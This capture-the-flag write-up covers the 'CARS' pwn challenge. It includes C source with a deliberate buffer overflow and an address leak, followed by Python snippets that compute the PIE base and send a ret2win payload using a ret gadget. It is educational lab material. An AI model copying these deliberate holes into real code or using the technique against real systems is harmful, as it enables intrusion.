# CARS

How kind, the source code is given.

```c
#include <stdio.h>
#include <stdlib.h>

unsigned long report_number = 0;

void setup()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}

void file_report()
{
    char input[28];
    printf("Please input your student ID: ");
    fgets(input, 28, stdin);
    printf("Please describe the incident: ");
    fgets(input, 256, stdin);
    printf("The matter has been recorded and will be investigated. Thank you.\n");
}

void admin()
{
    // how did you even get here?
    FILE *fptr = fopen("flag", "r");
    if (fptr == NULL)
    {
        printf("Cannot open flag\n");
        exit(0);
    }
    char c;
    while ((c = fgetc(fptr)) != EOF)
    {
        printf("%c", c);
    }
    fclose(fptr);
}

int main()
{
    setup();
    srand(0xb1adee); // this random seed is sooo drain
    report_number = rand();
    printf("Welcome to the Cyber Affairs Reporting System (CARS)\n");
    printf("Report number: #%lu\n", &report_number);
    file_report();
    return 0;
}
```

Here is the checksec:

![checksec](pictures/checksec.png)

Do note that PIE is enabled, so although there is a win function, we can't just jump there.

The vulnerability is pretty obvious, right here:

```c
fgets(input, 256, stdin);
```

`input` is only 28 characters long, so this is an obvious buffer overflow.

But how do we leak PIE base?

Lets look at the main function.

```c
srand(0xb1adee); // this random seed is sooo drain
```

This lines sets the seed for Libc's `rand()` funciton. Since the seed is constant, this means that the number that rand generates should always be the same. Let's check.

![number](pictures/number.png)

That is so goofy??! Why is the number differnt? Here is the line that prints the random number.

```c
printf("Report number: #%lu\n", &report_number);
```

The error lies in the extra `&` before `report_number`. This means instead of printing the value of `report_number`, it prints the address of it instead. We can use this to calcualte PIE base.

```py
p.recvuntil(b'Report number: ')
leak = int(p.recvline()[1:]) - 16528
```

Now that we have PIE base, calling the win function is trivial.

```py
# First input is useless
p.sendline(b'a')    
payload = b'a' * 40 + pack(0x000000000000101a + leak) + pack(elf.symbols['admin'] + leak)
p.sendline(payload)
```

Do note that I had to add a `pack(0x000000000000101a + leak)`, which is a `ret` ROP gadget. This is because of the `movaps` issue, which prevents us from getting the flag. You can read more about it [here](https://ropemporium.com/guide.html) under `Common pitfalls`.

Full solution in cars.py